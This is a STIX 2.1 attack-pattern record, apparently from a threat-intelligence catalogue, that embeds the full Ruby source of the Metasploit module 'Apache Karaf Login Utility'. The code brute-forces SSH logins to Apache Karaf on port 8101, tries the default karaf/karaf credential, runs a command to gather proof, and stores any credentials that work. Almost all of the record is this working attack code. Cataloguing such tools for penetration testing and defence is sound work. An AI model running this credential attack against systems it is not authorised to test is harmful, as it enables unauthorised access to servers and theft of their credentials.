{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2a5b5c58-53d8-4a92-8959-3bf881cf4f86",
    "created": "2024-08-14T16:27:29.883846Z",
    "modified": "2024-08-14T16:27:29.883849Z",
    "name": "Apache Karaf Login Utility",
    "description": " This module attempts to log into Apache Karaf's SSH. If the TRYDEFAULTCRED option is set, then it will also try the default 'karaf' credential. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/karaf_login.rb",
            "external_id": "karaf_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'metasploit/framework/login_scanner/ssh'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::SSH::Options\n\n  DEFAULT_USERNAME = 'karaf'\n  DEFAULT_PASSWORD = 'karaf'\n\n  def initialize\n    super(\n      'Name'        => 'Apache Karaf Login Utility',\n      'Description' => %q{\n        This module attempts to log into Apache Karaf's SSH. If the TRYDEFAULTCRED option is\n        set, then it will also try the default 'karaf' credential.\n      },\n      'Author'      => [\n          'Samuel Huckins',\n          'Brent Cook',\n          'Peer Aagaard',\n          'Greg Mikeska',\n          'Dev Mohanty'\n      ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        # TODO Set default user, pass\n        Opt::RPORT(8101),\n        OptBool.new('TRYDEFAULTCRED', [true, 'Specify whether to try default creds', true])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        Opt::Proxies,\n        OptBool.new('STOP_ON_SUCCESS', [ false, '', true]),\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def gather_proof\n    proof = ''\n    begin\n      Timeout.timeout(5) do\n        proof = ssh_socket.exec!(\"shell:info\\n\").to_s\n      end\n    rescue Timeout::Error\n    end\n    proof\n  end\n\n  def run_host(ip)\n    @ip = ip\n    print_status(\"Attempting login to #{ip}:#{rport}...\")\n\n    cred_collection = build_credential_collection(\n      password: datastore['PASSWORD'],\n      username: datastore['USERNAME']\n    )\n\n    if datastore['TRYDEFAULTCRED']\n      if datastore['USERNAME'].blank? && datastore['PASSWORD'].blank?\n        cred_collection.add_public(DEFAULT_USERNAME)\n        cred_collection.add_private(DEFAULT_PASSWORD)\n      else\n        cred_collection.username = DEFAULT_USERNAME\n        cred_collection.password = DEFAULT_PASSWORD\n      end\n    end\n\n    scanner = Metasploit::Framework::LoginScanner::SSH.new(\n      host: ip,\n      port: rport,\n      cred_details: cred_collection,\n      proxies: datastore['Proxies'],\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      connection_timeout: datastore['SSH_TIMEOUT'],\n      framework: framework,\n      framework_module: self,\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: self.fullname,\n        workspace_id: myworkspace_id\n      )\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n          credential_core = create_credential(credential_data)\n          credential_data[:core] = credential_core\n          create_credential_login(credential_data)\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          if /key length too short/i === result.proof.message\n            vprint_brute :level => :verror, :ip => ip, :msg => \"Could not connect to Apache Karaf: #{result.proof} (net/ssh out of date)\"\n          else\n            vprint_brute :level => :verror, :ip => ip, :msg => \"Could not connect to Apache Karaf: #{result.proof}\"\n          end\n\n          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n          invalidate_login(credential_data)\n        when Metasploit::Model::Login::Status::INCORRECT\n          vprint_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n          invalidate_login(credential_data)\n          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n        else\n          invalidate_login(credential_data)\n          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n      end\n    end\n  end\nend\n"
}